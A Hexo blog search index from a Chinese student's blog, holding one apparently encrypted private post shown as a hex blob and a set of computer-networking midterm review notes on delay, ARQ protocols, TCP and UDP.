<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[flag{H@ppy_N3w_Ye4r_QAQ}]]></title>
    <url>%2F2020%2F01%2F01%2Fflag-H-ppy-N3w-Ye4r-QAQ%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 9c5f2433c2fac15aa72cd3c028952b1d8b9e6b1ed0409b969059b8088d5e6d060991c0ae72fc520422b1c2faf131e990cc405c67138198e3048ea91583b61ebfb9ff4d74ea2d823044a80e4f0cdd5a39039b274f322edaf6b2ad686a44d42153b29ddd09da88873b0359d10030250d27f3da907d1d1cf2b3f5b5f1116f006e1b113dd91af26e36c2b4f85f0f4852a046d98c206fd6508bd33d6ebc3b5d12f93100d7a298045026c8c47ae725adf5d51a6bf07cf8463551cc1333e16ebd45613db0d272b8525569ca539d88a92a36239966c026bbb9c548ffb5db6b55bdeb8f3aba64adf0a5aeb0fab963d5675dc8fb80ca07509c1954387cfe0e0d1d64e9423c465aa985dd67ea5c9c94a3c2dfa02acc1c532f7796f098abba23aa66f5d33d4f751a810561f59aa6ec5be56ca01975b6cb1dc7a24e5e721d53b4794eda098edc5e7be2bfdbfe50bdfa879d32ecb66184a23ca4d95370c20497c1077b7a86a09722a31c116f8d6bf11b5cb75a82fab9a8ab1a2fc0c4ede26c00767cf56595dd640a684f9e45badcf130e950644f10e6afb5c10c73d33fceee43b6495f97afeed08539672902c0f7f9e725f2d2f6f1015d83bd984113d1fe6b5139fa888adb32e35370d6fc67f787f086c2394ea226ded60d02900cca4caf5083749ceec8bfc9618f8a1506d5fe3cae5dded07cb310457380b3df6f831dd7e02fc76b0337fb4802a651c2722ddde37de1579c4265402120d94b74b90596fe2dd333f4f98bcbd30327e58c3ba298b1fcfc8badf29f099d06cfa83c1b9e6933ded729c305e28026809f1fa4aa9628e14d1d73fe845e89f5ac0b3ed263c1298d58e41949de1c2863336ea35acf52608b879b6ffe0adad33ec026d0ce96ec5c08e3d29b581b78ed15f907866db508ee2af1748777ca32167700ff3bd5132952a35f618ef65a52f114e453d1d5fc1a57399665a01c0c52855f4cf2f41f8dfe25062ed927df5055903de759dbd6f9605f35f09f7fdafe4b277915526fe51ae19547bcaa28fd82f27d23784716f2b4c136ce4999b65681e6f743581ba34ae3f6f05d94f6dfa9f68c333ac17a81e8e991fdf8f03a6e007aa05d79ed65b14a7efd9d4379f7fdd6d6290baad0fe5080f6b593ab6a466853904333dd502c21130818484012240dbb51e2cb9eeb08087b42af0e920189d305ab446a212993e1c97cd271e9c3f1253081defbc7c8459386563561499b160de77403aba91292ec53c9e67a437c9575db05306419b9aad78070ea8a626657fea90c3b8a5c06ffb88b5e4d318334ac7c7d47354dc2040461dad96e17165f1ac8b0be7009ca5e7b9cdb78868aabede905e363821eb2d881e477a811fe9873c68bcb9eac1a02ca8ecb6a53f638a81cb981912fc93abc8f7c2fe020a7c3b772c2c9edde172a3a232b919829c9af5f7d1320c8a7b3b9786c44e191fea161073a6c83cb25658fefa66fe9b2888ffcbccda8678664ecc2c31dc52f70e2ac6de47067485fbea8f0fd68379437364e0a1b52c9e0b7a97a74310380aba93863f8933cb168ad843240f6241c62290b56f58be2d1cb359416ecbb98256ed30d33d9a7547569e39021d9d67ec008722f571621a4f9c137d9169fb51821e795a6d28f07d879e390ff37d6c9f3cfa6cc5d3bcba887af7f079059c5fbbb56d18e40e539807fd5c61fec802dce80561307e3372785f6f599e80faba767e71f292ea64df61145f1c7c6f906881031911927a828e3e9d906a9f897da895dc42c8b6c135c5525a844fac9bed42942a1f297c7bc43deec6c6155f44dfefe746e6ff386c7c59eb100cf5fcb832c5c7e5d407af96099ab0dc66d39c51f14269e16afbcd71d96e4118ef52454182e5095cf1560d68b535085b5bd617824294e067973e78910c9f549445195658727dc6b625fa6fd59af422e4322660f42a9e2570ab590dcd86a257936b7f97b05952065f0b3db264e9ff460046939afc5c8d8010d758b3c088c752b5c886f9318f4f3880a4203d7c8532d15b86a04ae03393dfe170bcfa8d7dc2de9c67775f6d586006a43036675f46807cda5c5dc8adafb727e837bf40e1e8eff5f0f6b9298a3f47272d7499b0e0dbb12bdbb6feca3f16ec64982fd0fd956d10bb203a1ca742b4dcd0f7eec5fdfa23edb5f8843cee5a7f28775002807171a8286bd52b97a6009c749d1fbfd9335d58787cd1dc1b7be276b6e944c6b18eb86fda6208f4c08dc0f190ef5eb4e5f3545fc45020a9fc6667dc4c1a2b7b2bf81a46ec5c82f80c7d2a173d3108d3f8fc780c6300b41e4bf02b022e33a6bd62969d2ac20cdfad3c8b21e0cf8911267686dead52900d2b047449779ec6ffa4f1c93412f761db8277cc4ce1a262586436375c117e159941404578be09e1df5f00c495528269074093dee9e9c580bb16de748c1407099313e4d1113b6dbbd7ca17f14a701f9ca3968379703b55662b1b04d4e869872d91c5155a00bdd23ca69adbb689ede8ea38ef91e3c7d0fb3879ce4f2792ed788129486039a59681aaac2691de7a22bcb9c132eda33c7ca7fb8a017f285b5d1f6e8c7852bfd2d3d88d0012b3178455f523a8fba7bb0dd09cea24d6b6f068eedf74aca2060eb3b6b6364dd53c643ac1c15033b819b0bda0f0e1042a73614d9bff6ba0b9aba9db7cc999340ba6120dc39129686f2e0f94f023191f673dffb6dcfddd6c177f85159306c58815c6a26eeef19127f5ce7c859141ee1dbfc3db0b0590b8fc4d242609f317fdf9e149046eea03de362f7b8349fcd63f70ecbf609ea25639d070d5bbd0c6986deaf9e47f6c03cef98fbe97876ceaf3c160d236bcfc746bafbdf8c537cc736633d8395b3f9fb7abca99f3e10e6f6880201f6dc5b464234c4612f929c556d0f823b4e692b187ee2ea3b7783c87477d6e57ccd684bc8d550d15a78509e481282d1cae7d250f7410aa0b3f61dad131a583f9b76ccda93b32dfa34985fd13ebed2a2bc9f7d879b80f0c8416a14c4012d8ce52d311be42a45db607f0a9e951f35e4a1bb81cbae8ac991c16a94b865b2c617c9e93edeea1ac7eb88fd9cd305220491d861426be59027e54a30d652d342ad5a495d2a9b40811713fe7a6b5edb4cbd87c1bf64dd1452279b5a6166023b103a608a5955cdccfe19a285c1b63a24372dbfc5612e25850bda311647ff8ee00df4fecbfd8c2354f597b2d99fba6f8467af79ed3ba806a78e6e7bcbbf709c037d86ad4a0a745009dfa8461b4eb397369294d80b0022305bbcfb663e0b43fb90b554087318b0ba11f177153d7898b914f910f8d92f78194dabc781a7f62697b23f38760d4e15cea0892e82a002fedaad7a9321d68dbc77c0d28f3ead121e99d21becbe6ad0a789b48bafb9a76e0c3888ae462d7ad349c6dc5ef3f9a2e2cbc4d0d81cb3204ac54d89492051513999250c8c01a2e7a42a202db2126884585e865583255268bf59ba61227e62fcdcad8985fdda7952ab58d07b1ba0b9b0eb51013d89a4b21b94aef8a59fe8c5bbfe9ade5556ec4fe7cf9e677c09180e872d3a11b35376f24734bf7aa12daa3ab696cb0fe95da4ccc374effc6964c5b0c780b420da9a3b41acec9a2fda0bd623ef4aa7e7aaa05fef1cae55c9ac0aeebedd495296af2eca9d7378ed4577f8b16d9fcf81d00e6102ce1e33dc9e9962a358b902f300b4dfb9f48ca00efe73bb1890e227ce8930b389752587137b2a7d69baaeecf2f855dd83282af64add07fdd9fa31a721190fe570060ef2ad5cfa4789049095f47f8a7a25a1dc0ff292493bd1e3937ea24ff3ef6049883576ec46866172ef71e17b57697fc209d3ab40fd3c15add233820b63ef8446f79f5c5bfdda9f6d40953a8ed093fecd339301e34552b660655bc8f4bf7bc980a452a4558264b0e5df6f198f7b99bf1a3d03e523649613afebaddd0d94809df2d5dc863dff67c4a909584ea9773b97f427f8e288b6727480273c0b1771da0a3c31d09f4b1fbc95f437305732ae482bfcd3655536c9f825476e8db0e06520c61f7b56604ccb1f19fe3d085add378335880634117f2a23d1a2c8f291e88db1a3fb94e9859309404259b15d50f9e4fffef47c925978d436f42ecf4c8564c3ce1557a5b7c9219287e76a8c9f227131538163a6fa2a8d807fbfc98980e800ad8b73e07ef75b3b25f9ea49bf2fe1db79d65b8a19e5af6a7dd5807324aa2a88571720db71d5ed1eaa304f188539d3c5960404726a390f5c9a37eea43af615fb13432a9f318f48c8a0dd3ffca4c079b04db1bcecdb03d3966554cafb0622fed8d15d9d531b9ee80d943a1ce855a5c68de1280d86b6bee40f7a2345007c2f991f6e64bb87d4b05e3369d604a93ba71a85044b274c2e06082b991ca598baa84605f3691e452a9a2e1d580ca83fd3500949154ced263a5f8310e79e2d3cce6744b60f64c45d2cb75a2c610efd9da020b7e0df69bc53ae88765a0da4d0ae9d421e47d65457bee5d7183a7c654d14e3437c505ce36c52831f4d19671fa4c806b239c1a73167b9981e66e91bf9ec2badf76df4f5bd786ba667bebd2cbca8740a620fc25fa930289a5a21c3d7e06dfcd012fcb35008b0daa55d4698e019e6679b220e0e84804644317606380986bd0e26c26471a4b9aa74e1da664f5ebb38b7df80342f0dffc70509f2f4c1cc40c882fb3140ebecc7668347dc8fd8eed7cf26d980e1a5c8b8227e84f79436d92d9b4c73929ed721ab250062776f0803e44c894c23d836acd55638c202802ab7a6f38d099636b986c84bf750bbadec656b540ea4bfba265e3bf87dc2c2fdcf42c8a523d61d15fcb127aba4a37a8425e846265257bf5692e24f747fa3e743077f44ef9cd222b5ec36f95dd9610d5db71716e51880aa68192e922b5d08a5af7eb1e57673dd6eab056f8c173882992d6bd1aed8c4650c7cb916654cf6954928c10468c592129862c3aea6c8d60f5a0080a1f30457d7ab9cb109e618743267460ae62ae65f1022f8e330f919125943a30330b63a022870ec23479ee4de87567eecf8bbe23c4e4fcdcb32b957365854750f2ce2c9ffb0de950610955a5dae31c2c77a420e38967ee60fdc0e55e9f1b46b7d6200bd76c983090d610e720bcbf30d4d920ee5ff8cbe5af6a1633172554bf158c859d27102594c2924d4b75fba56d18b0aa149089032f9e5d4ebbc0f10dad0358c3924290c6cb54ae7827581e4c6e59af23ce0e308b709c6c5db4531491d7dd944eb54abab7ca6d8940b93ef343a989d5c9c0857abf03282a19682720b870b9fbc6629fce543b6ee7bcf41992a61bc3007468bd4f3786aae252701b86f508d964e3c132321e7d8f293624ed29b754978a46086d4121d2781c058e478cb327ba93f229364c28611c67c90a549cb32d91457efafc510e2fba58ed28ea7d1f00441da354c272fdc4003ea7a028765ef6294308c9287295acda6bb98e795f1b9d083f81b921fd54b6b60207d57712a25505fff3c8abe2daffa5891ea7343d8a07b40ccffa8f0b1406c9a7df7c1d7d01a8421a127153cd0d2f84c929e3e8fac074b0e4f602dc3e63e9433bd7cec598dffa6804b51985a57099e69858d186513d400141aca2c05b30f7da14a1c27ad187a7a69fbc1d54bae2cc16686c6535259c9f3fb0b9ae67a96fe1ae9b86db5881b962837737d101ab11436fb9a635c94b5200a718def1f82455393dc1e720a5d266f1912dc51d38d8e7bdb06a3dd72be3e8ddaf29843ccbf912213a0914b10c0ab19548c24bd1fc6fef8f2ecbc6d41a375dd8b41002012f38575426c1a1658658460b2d536a55a529673aa404e211b4807f9041f59a736051a9ef2fd2ae5895e272f345d21476d0b7bdf1febbafb27cde4ecbbda7874ce5ee6a531340a08eaa01e89dcb8a6e5f0767eec287dc22e7b8e43ab8153b9619a7a66e89489660655b7362ea4a1102780a8b12558f0d092d5d4f004851ad3b368833d6b269d780f2a5ff726832fcc66cc455f5abdb78d12d999a34acb6bc1481731d1698c5beffb4525a81d01a48990e268703a3450a6b6d63ab1aa87cca02e28bf779bb91d8c1df72182462b188217d49e43b7b10249d49285dfb871bd97c768378efb974bb3a551815c55c5e7077e35efeb594b632a39903f2b33b813f3efa0d0573d1975b7fe05f88c6dba0471b3c7ca8ca7fed21ba01e172eda3c41084cad188fcca9143604f58f895f702b21773a0bc5b6f9aad9aa0b8c1ea2fc0c303e74a0cddea9f3560832aa172c15973cbe4fde269f1c2ab623a785bf6ee889d639f9d1ee9ed1b9fbc713f170f1f6ba4384994cf61e19e4b0e90446d863a9d4b764a5c60862d4f6872cbad733a67354796a59ecaacf50ea03a1671c75000e20177d151c703fdab1e46824756fe3837207e7f4bc83185d3514d0ddd053745fe95d5f583a842a01604638b78bae677be416af4c3c6a9d0ad66525d5b9230c8683028f0cbb2c5d55d2b24b87c3db12429a21daede54c683d2281169d1aa83543d053a6554b280410e4a0a626ffdaf83d0e8b23b23d50e211f26762894400b3e33e92f57cc8153254d566e19102b4cc1347abb46e603e45c2fa42d0da4f766bbb5630a4fc69ce9b6e865e9ab87007c90f8ad0b8d1a3fd5749f7e580d6dc6d6cc67e8f0b22441efbb134d172a5f0b2a5bda67cde3e7b2029938df1a97cc64e2ad514aa425386da6f063780a053a404800b2de4502e48b0c97be0bd2a768fbbc27478b61edd50cf9740bd262a1220e6ff08ac602540f2d9e8e93be759de94f7576a67b3e11da59b69bf5cf9b9efcbeddf20abd4912c45f8e066a6002ef3a2d693f392ed1b2eae283dd855dfbe841151270bec1d953f79c15a450644ceb0dec004a5a66597d9a03990b5e9274d34f52c848e6e2c977bafb0d9971349bfb2b7faa1238f83503f5a571fde997493061eb9108638c7c0165630e4fd6fbfd65e8f566b9c44f2ae44515dc4085fc5d8b20a11cb1c32c6170bc730a7157bb7bb1b56f1ce575288c2a72756bfc00d2000630af4df551df169698b7401d8c8236a2926cbf42d2d307bb42a5e69eec7e826695c05501571774f2d38f6a59430210f01ab142d509a548cdcd9ae406314563718e2b82821c4c4f9117b7e0a8e107291cbf0b4889af78a860d442f4c49f68e5b28dfff4441a352758e47be308b4365a013b9337c14e93f19fcff516a78939e649958c2e53ddf359ca0ca90d860577f8caa0d130f91ad4e2b655355b37761e6ffcea9cd3eec749564c1bed9afa014d2eafff79edd4dc7dd406382d3d29d1b1c54b4f50e0596a7e351cc03816a30fbf347bb02da2c0a9f5116754bf9e9a4363efebe49699428d92d75211f4e36440bd7337f265e40ea984b127818f23102b9320a6af63227153715d0f6d610de935222e31293d5c672afe6d6267770329e991a76d3d2babaead58c218a659057595215dfc5c605f80275426ec18e460a186036c70380dff1218a1f08e0397381e89620a4926ed20c522f0523dcaf18daf0ad6c531a59a89e16f6ae37e4bfc5a70f350c6c6061e989eab03cc4b279c5a1ae66ba4c7373ebe83c0527d954e868a123d6d10548de6133042b7c8b2f3168b91b697c0dcd2cea2ca1985730d65f7bad923b8f10f2eabdf8db9233cf6741215926f47455aee2b477fc68f9a1dd1b6297e682cc68ace166e762911d74f8cf16bf356a32e1ebb00050bf2399f2bb25486be6b09db8ff48fe0bc0a2c02792f9f779a8f80d8f1b0885ab37e8988a2f123b90aea1c1c95c63edb40aab5fb4b817ae4e0c531f1fe80d59ac0bfcdccf2e672197427129115824ad1f6a12f041c0ad7b9b7283df386ec86ed5e1c6ce6a96b3d4fc458058edbcc7bf043b47eb3d1ea9a5f2ea325fb255aeb6309dcfd5c1c397ca8d8609eea5fcf8ce807417ed9e9d718ab720a2f6e48e8fc16bb716f6bfc9e409beea05dce0ad789b53779b3b7bd28a01667d258109454485943caf1ccbd4fa738ff44490a3aec0e2ba25f602417ecb840d5014bfa5ec9fa277890a42843aa2411309d12d23c64a3fd0370634b8521a1555cd545fc6f82c20e5234e242a1e257a85b4d323230d6cd878fe21629d3a178a7aae4041ff0498326865c0ff45012ca92e6e62f6a3f0c95ab7f64ff5ef275c9b64e19687744ee1a0e9db3252095a9e5767dcccef3286d5a84aa4b8b2a7124f7e1fc37a32fca39a047dc8e2ef4c84e36dbf1351a509eb94d29fba8305d2e97d4753c8cf45e4d346192ad197c5fdf960e02d17e9167c9bf2acbedd1b525312547478da4cf2248e70108924333272d2023632a8385e72e33e1b9b1810ed8b4e6f058e4515913cee82573d49500ec6e538b5cd9be98ef488c4aa808d6abd44e1787d0ef4c2328e62dfa5cd300d5b04431f2d9c99e5b988bda6ee60fbf5aa0f71e82805e8c1dad7a11f578b697eb1b89508a9a3aca7e55844d6bca5508cbb95140c120fab3621b99d140cc8d36ee2b878f0ed8708af5b6e58f00bd3735a2761f902d98a1f00527c0183b23a946cc23b1cd380ec6f5d3bbed4f741f5987748c5f9d5c2e4a80eecadd0cd519974b5850e4717369e4868d666d2bf8751979a22761e53121040bb5e3a70773272746b15ff094b62f66caf9998e920ad87ddc2b00a758108e2d449928faeacfe2e570f912f6146ad61fbf4d5043d36b82c31ebb3d5bd1c560cada96414a64c4a18bb183ccec2a53f979c8552ae721045d98f46f51d47e3958d54132b98ce25e7d98cd348789221c6986b1377814c77f0c58a6a93af485c1e964d41ed0b0f9fe2a044e9d3d8497fef4c98bd9b174430e6c7464c96fb193cc8fb7fa5ce345a0802cabebd2934c9068e34d4fe4bc10c689c7e60b5ad86a25358c2efa005ece00350130996e94677c9669350aa581bad346a64f9961b5f9dccbf073edc230855809cd96627c2ac833a1264917d67f997b3562a9adc1edd818e9dbae6f8ede538007ede5581412c277caaf37b9cbe3ae20339b4335007aabf9157017d0ab5628b9d4955182c001e3f8f942338c5fbb00ee7913e7d8364e0727723e71a7698ca43ab41180c528ee448b98b0ab9f0187494bf70210873f718a28707c90eafa47000f351c46c9202ae19183035d764b759ed4fbc10eee8ef82f7fb27f2d9028ea70590bb3e1ea06f05a6cc7e6902e8e31b8ada20254caf2f2f79935b78864d108d9b0d417e2f96bfb198716e57509261fdea9ebb81ff126155864e5ea89703370544cc284a6a7005c799544c167ee25efe3667f6c402ced47940426de2850d5c296244f5ae055ea8c4aacca270e36454a6d8f07a076c01e03cd0b60831732fb8b49000dd6aea32289e7c45aef11378bd89825f6ab6c5c65c70c8ed31c4c99c246185aaba0ba933a384eb1d18377bf0899f5e69ae105f82cc34fb40c3fed2809611a27f1d9f88f059f19ad499d5a7cf9263a774b8af7611d2dbc93186aba30f8f58a510a87883d27df003e83e9032883124f4c46ef7c58687d0f13134dfe3301a8a8f7a1bdd90abcf01d40c84d2be47ba80fc0b7ec2fdc5f277895456f1da516428be980cd48eabe5c02dd9370c8d8939eb0034629bd67ed493abf8a2dafa5117dbfbb8edcf5531bba614b76c823a8d03e83c156deabb7a60069d95f695c0212a520f658d8e348436edcb1fac4a51428c60fed276ca03536758fc02d3a8b62be61e8feefd7547ff96492762c4fc09bc4051c2ea458dba7f55b03fd8d0d6b056610b8abc1c0ee58591b84802e11411fa28eadf6d936ff3f307ce8f19b14f38f96b77e6ea55588931234a594678182015ecd7d8c818c8030e0ba00282452a796ec4ed7892d3b2b726c3e82f28eca05418808017243be181f3147e3e3f12af878381031900d6598e50dc8c00db3a1956ef023b6525c6872d496400d67c0ac9501f3a88738ce89f78bc0c8c6987b62e80e33fa74dbeb59242401ad296dc2abee787f235073a099c7cfaf72003423fc80c8a5ec622960c65ad1c9e5040d3c7e955bb3d2d914166756ab2a1bb4b63f9aa0392bfc3e98e249601140fdb715fe5d2bd206e7286fc450d7323c648eb5d42bb452d189a6e50586f66c0348caf7e72505064c9ea6d4b472742934c41ba970ed5dbd1e38bee0c4881dc01a0bcc28b848a1d175d8bf3fd3c6b757cc5875c73fbcffe10a183d2ff90fe19173c4932b14445aaaabc301d1096f2abac2b791ab003f82977b355882640a7d1ec3f2ee980abce83c25313a4d37a34e677054b90437976044be55cf4582df526570ecb16ee7a7080474c9376c52adf3a2e8dd87bdbc82867880392c1c522a2ef8f95b7d6e8894e9a206cb2c405f90a1f2a047fd1ed77324985a6e783c5e6741a2e7eae390a16aad219543316a95f747bf19b9b8b855b555cf27e95bd5ffe8182c56ddc5d342b64f39f832c2dbe0fd167c4421d626f135af79b744135cc6f242a461e68ce649e457a840ca218a67a205c1524315cffc1e7a816c7e7d4f0f317b5b67ac34997caec0edf0a039d15ce58dcc9a82c2c3790d52db09edb5accc04066e4c34fab1cd1bb37b8c714038a2e3777d2127ce9b62f9d7e312acb166fe27c1df2ab5e351e489f1b95996af6b31885cbc69c054c12dc44aed3cedcf21a734199561b8b9ecf7ca4dc17e22cdd686d50efcf33ebdf061c433af9a97da3c5590b26d1eda9a121deb197a86e18ce02d32195cb533f8bb3aa9457496527943fff3df316728326452b93d3b13b7332fbd635b815be81c3ad3325f31ffc70638461c6e4617626158d14cac7b908b7a49f0c324309bc24512fcceec9b05afe677ec022004e0465ca50205b4ad54875a48f1b012ca441f853768dc161d8ab71f3cefb7e54c2ba1051d36f7eaa73f3166bcf3e33fd500cd30448ed7419889c8acccdb6831f5470d65614a5d6aab21e46955defe5202fe0382dd2351d0f49911a284335036ca345f177210943cb187c1a00a5015553f5a2b908afbc6bcf0db1dd46fb4aaa37da000bf995ccc9cfd36a926ec8baee05091c5bdd2d1946eeedeec84b830332e174a27fb7995d7661296078f25488539b100f813bb7c2a99e70b114a76158b5e2bf9f5067a38e5ba95f81760d4ef6320d54162d02e64eef30a7d09f750dcd362934db3220efb8c246729bfc020453cffbe85b8cf4df599066938807c6410f356e48bf2960047ab06450e7c5ebfc2c72eac76ea4a9a665d882f44f1e6b6602359132c0f3cc4ad04e9ceda934aece1f199a7b0021d8acb3eadd29a665a5a23f51cef1f2c45deec26fd8c6d4bc896286a53a308c356c3d84ee51137f3ae49755450a4988d30353acb2306d7bab151e4953372e0c7d6fbac825684b975485b23e9cc9818d8bab863890adad5d5b2bce486cc3239512db569db6d0b0bc8c77666fbf8669884d2dd57925b9441653f1a1c215342267ff3ad3463687398cc284bd0b885158ca287302c8ede12cd139a2d9ed4894c443cef969653df695a3e65ef9acac94f443b41db69a5e61ccf0e4b94ae6bf294c85199ba1eb2851d29bcd20b50346e0c97ff89ca7249b062dfbc3aca4682fb17715c471f8d09db61ddfd6710d1f2897ad7c4aebafeccca5b4e650ff585d1f44b1d352855360fa53ac3223a768c6c6f57f5f98476ac18251938dddb046a7c105baea2e0f23bd2540d83a2bdfb0df90a17b2fcc16c142d3267b2581db77bd3f5960ba5368827af6c13fce816a567bc3338478ce2b67a509454e820702d8ad6f9b445288d6c0f33a86fe4926de5b42d37c87083a799d9bb5660ae83c57aaf685633ac60bc634c4dc2f1a2daec1b5c68149a476d7af10ea788c04801452f6f8aae2f9197737395d8ea188081c08573259a8e5c0f159dc2d95baef9987c05981bd79e62b54456f60c49e98e17ada3d1ff0b780803eef64d38a40df75c78908984fb60c4fb7c5e4339bfdc48a5c294c95079c44f1b3f23b543a84e3c8de48afa8c7add5622d3f33d1bf889139ed874cdd367197de3ab6d125e3e4a0e44593c885619fc3bdb45f536cffe640b03bf129b8f754d90b1a745d2b54260118548605bd9c5c2057f812897d479a38478773bfc652fbc8895a8030b51c27c230db1ba7322a17e71197c4abab58186775c7b1d71a90e1a1ef505f1de7e034b6e8624678bf1ec185e88e9855dfbf785d63510c6fc8ee0f889b6e00472edb6356cb03f14db0ba961c67250abfc47200e87066951faf76a74b687ea6d6ffd21d53dfdc57491b5e61e0254014c85aa9fd56fc66078a519abb5d007f0422b8c8a3e7e1f1f6aec1ff042a189fb160340b8449967fd2871d9e0a02daaf8e99e377effc1a55028fd22dee7584b323fab7a549af4e56e79b1d7f535df8a7d18d123aff519c12569a4fdbb2dd94467acc69d3be936237b0a02471308bbdd9c01650fa7b1d419ccfeab6d9b48c2482476bc37700b18e2e23fff53a9468610ef6ddebc1dae499308c2a9279e0c1faef1a99b62bde767303f26358b1e9ef7099c5bdc50df010f58a8573398217f0213c77dec926f16582c1c117bb75c9762ebc858ed57654aa3ec474b6f233b8c9285a64cab40c94644cdd035e391ec488f3eeab694abe78b0d75c4a1fa3154c00c60c6973dcaf6ce95b60f1dad671bfb29dc8ef53e3da6c4d6a6a94d824231327683475b094c3b542ed469dc0f5dc6571c1c374a0ea4703cc8b9e35ca7ceb462f2d8b9c3e18881197aa7b5be39c3052f38bed05f35e83c92859431347e8432f065aa42a40f3e1c9481beba19b8ba2e5d04fbeac961fc07d8fa553fc3116585493063270f5fa5ffef5f7017ed0eb5105fde358ebce6cb4888496eb1b9ac9cdaf39cd50e5f27ccce334ac66a9309e79f15967950e2d78890933a6ca6cbc07a34b54326809a64b52c4ee770cb3d91c6cbd2a9e4c7ca8c3e7d1cf8b78c7337592ff3875d669aea9ad0d87c7c3efab6d33f130803d75cb8423683ae914e2e6720675e7ea1e3583ef0d7ee95dc8082a0699d0dbd99c71885ebbe7bc95e770a5b16a53645d9d6b973d7becd9a18e7233ab15b46449638a99001d7f84cad4316b6a7123f6730ee3b9ef57d4289b57d6b6deac07e9b5284ec65d339448d1624ba29cb1dd253f77d000642206c5825b640bd3b564b1ecf6e9fc969f8d4f3e506d9418826be4b4fee29b39741420689e4f5035abc6b19baed160f7ff543ebbb9da11e5de572404ca0c822171051e0fdf77338fd380d81b8b39c65f7e9fdcf40483c4292137209c3702b03cf0e2ec656e5736aae0a96c104c4f427b28d86e354290cd49f94c97f56b0796bd55f77f202e4d9c7d306cd2c09f450f1ac1e85960f99ad4878bc61a2b750b071db7834a45ad7956e47d25cfd3965cd90fa2aff14707417d38c46cc21d52973132db951de04ef1f6694f6000e409d49db31b7655737f1d640f90007ee8d1c3a3dbe18fdca9c293099f07be]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[计网期中复习]]></title>
    <url>%2F2019%2F11%2F21%2F%E8%AE%A1%E7%BD%91%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[前言：唉，失踪人口回归。。。好久没看/写博客了，已经荒草丛生了感觉orz，因为自从上了大二以来，课业压力剧增，无论是作业的复杂度还是数量都比大一时多了一倍，除了周末以外再也留不出整半天的时间了。。。想认真完成每一项作业还是很耗时间的，尤其是那些很恶心，又很费时间的大作业。。。再加上英语六级这个大麻烦，英语不好的人真的留下了泪（在B站看到一个小姐姐在德国用四种语言怼废青还是很解气的，也许真的碰到那种场合才会感慨为什么当初不好好学英语，如今却混到连六级都难过的地步。。。学渣叹气.jpg） 周末百分之八十的时间都拿去写作业和补课了，剩下的时间就想好好休息一下或者看个电影啥的，因为十月份去了三次线下，课业拉下的太多，CTF的很多东西真的没时间弄了，很多想研究的东西只能在假期搞了QAQ。。。因为很久没看了，也很久没做题了，感觉已经被队里同期的师傅们甩下一大截了，在被开的边缘疯狂试探。。。 苍天啊，杀千刀的实验班qwq，逆向，Web，密码三管齐下，全tm是我不会的，学起来挺吃力的orz，不过到大三应该会好很多了吧，因为已经积累了很多知识了。。。。 因为最近很烦，又摊上计网期中，就拿计网复习笔记来水一篇博客吧。。。QAQ 盗用23R3F师傅的图233来表达我此刻的心情： 第一章，概述：计算不同分组交换方法的时延时需要注意，画图理解可靠性更高。 时延 = 发送时延/传输时延 + 传播时延 + 排队时延 + 处理时延。 分组交换，报文交换，电路交换三者的比较。 网络性能：带宽（网络可通过的最高数据率），时延，吞吐量（信道上的数据平均传输速率，硬件的吞吐量就是带宽，带宽代表网络吞吐量的上限），丢包率。 OSI七层模型，TCP/IP五层模型 第二章，应用层：C/S vs P2P HTTP：80请求报文和响应报文的结构 HTTP1.0 和 HTTP1.1 对比 Cookies SMTP：25 &amp;&amp; POP3：110不造要考啥。。。。。 DNS：53报文结构？？不造要考啥、。。 FTP：21不造要考啥。。。 Telnet：23SSH：22第三章，传输层：概述：可靠数据的传输应有四个特点： 数据应在传输过程中不会改变。 数据在传输过程中不会丢失。（丢失的原因：1.网络或信道的不可靠而导致接收方无法接到数据。 2.接收方处理速率远低于发送速率，接收方的缓冲区溢出，导致新收到的数据包被丢弃。3.网络拥塞，路由器的缓冲区溢出，丢弃溢出的数据包。4.包数据发生错误而被接收方丢弃） 数据不会重复。 数据不会失序。 出现差错： 发送端重发。===&gt; 自动重传请求（ARQ机制） 接收端直接纠错。===&gt; 差错校验（校验和，循环冗余码） 丢失情况： 发送方发送的数据包丢失。 接收方发送的反馈包丢失。 ARQ协议版本演化：v2.0–最基础的确认应答协议 v2.1—超时重传协议，解决发送包的丢失 v2.2—序号机制，解决ACK丢失与ACK延误 v3.0—停止-等待ARQ：未有序号概念，只是用0和1来代表相邻的两个消息。 v4.0—Go-Back-N/连续 ARQ协议：引入滑动窗口的概念，n位发送序号 ==&gt; [0~(2^n)-1] ，需注意序号相同的两个包不相同的情况，接收方窗口长度为1，存在回退的缺点。TCP基于连续ARQ协议 v5.0—选择重传ARQ：接收方窗口长度不再为1，接受窗口长度+发送窗口长度&lt;=2^n &amp;&amp; 发送窗口长度&gt;=接受窗口长度，解决了回退的缺点，但是接收方需要设定缓冲区。 UDP:特点： 不面向连接且不可靠 自身不带有顺序控制 自身不带有重发控制 自身不带有流量控制 自身不带有拥塞控制 实时性好，时延低，追求交互性的应用多使用UDP 面向消息报文流 TCP:以下所有的可靠的意义请参见第三章概述的第一点。 特点： 面向连接且可靠 顺序控制 重发控制 流量控制 拥塞控制 面向字节流 为确保可靠所设计的机制： 序列号与确认应答（确保消息不会失序和完整） 重发超时（随重发次数的递增，重发时间间隔以指数递增） 连接管理：三次握手，四次挥手 滑动窗口 MSS 窗口控制与拥塞控制（收到三次ACK后快速重传） 流量控制 Nagle策略（发送方的报文尽可能的长） 延迟确认应答（接收方的缓冲区尽可能的大） 捎带应答（接收方给发送方发了一个消息，这个消息等于原本想发送的消息加上确认收到了发送方的上个消息的确认信息。），需要注意的是，这时接收方的传输时延不再可忽略，而是和发送方发消息同等看待，计算题吞吐量和信道利用率时需注意。 TCP/UDP和应用层协议的关系： TCP UDP FTP 文件传输协议 Telnet 远程登录窗口 SMTP 邮件传输协议 POP3 邮件访问协议：邮件的下载和删除等 HTTP 从web服务器传输超文本到本地浏览器 DNS 将域名解析为邮件 SNMP 管理网络设备，由于设备多，所以用UDP TFTP 简单文件传输协议 自己画一个完整的图加深对TCP的理解。]]></content>
      <categories>
        <category>课内课程</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[两道有趣的题目]]></title>
    <url>%2F2019%2F09%2F17%2F%E4%B8%A4%E9%81%93%E6%AF%94%E8%BE%83%E6%9C%89%E8%B6%A3%E7%9A%84%E9%A2%98%E7%9B%AE%2F</url>
